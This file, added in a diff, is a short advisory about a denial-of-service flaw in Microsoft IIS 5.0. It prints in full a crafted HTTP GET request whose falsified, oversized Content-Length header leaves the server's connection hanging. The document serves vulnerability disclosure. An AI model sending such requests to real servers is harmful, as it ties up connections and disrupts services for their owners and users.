@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/3667/info
+
+Microsoft IIS 5.0 may be prone to a denial of service condition when sent a specially crafted malformed HTTP GET header.
+
+If an IIS 5.0 web server is sent a crafted HTTP GET request which contains a falsified and excessive "Content-Length" field, it behaves in an unusual manner. The server keeps the connection open and does not time out, but does not respond otherwise. It is possible that this may be used to cause a denial of service to the web server. 
+
+The following HTTP GET Header, containing a falsified Content-Length field, is sufficient to cause the unexpected behavior:
+
+GET /testfile HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+application/vnd.ms-excel, application/vnd.ms-powerpoint,
+application/msword, */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
+Host: 192.168.0.10
+Connection: Keep-Alive
+Content-Length: 5300643
+Authorization: Basic 
